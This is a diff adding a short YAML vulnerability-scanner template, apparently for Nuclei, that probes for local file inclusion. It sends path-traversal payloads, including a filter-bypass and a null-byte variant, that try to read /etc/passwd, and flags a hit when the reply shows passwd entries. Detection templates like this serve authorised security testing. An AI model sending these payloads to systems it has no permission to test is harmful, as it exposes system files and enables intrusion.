@@ -1,0 +1,21 @@
+id: redagent-lfi-detection
+info:
+  author: RedAgent
+  description: Detects local file inclusion vulnerabilities
+  name: LFI Detection
+  severity: high
+  tags:
+  - lfi
+  - inclusion
+  - redagent
+requests:
+- matchers:
+  - regex:
+    - 'root:.*:0:0:'
+    - daemon:.*:/usr/sbin
+    type: regex
+  method: GET
+  path:
+  - /?file=../../../etc/passwd
+  - /?page=....//....//....//etc/passwd
+  - /?path=/etc/passwd%00
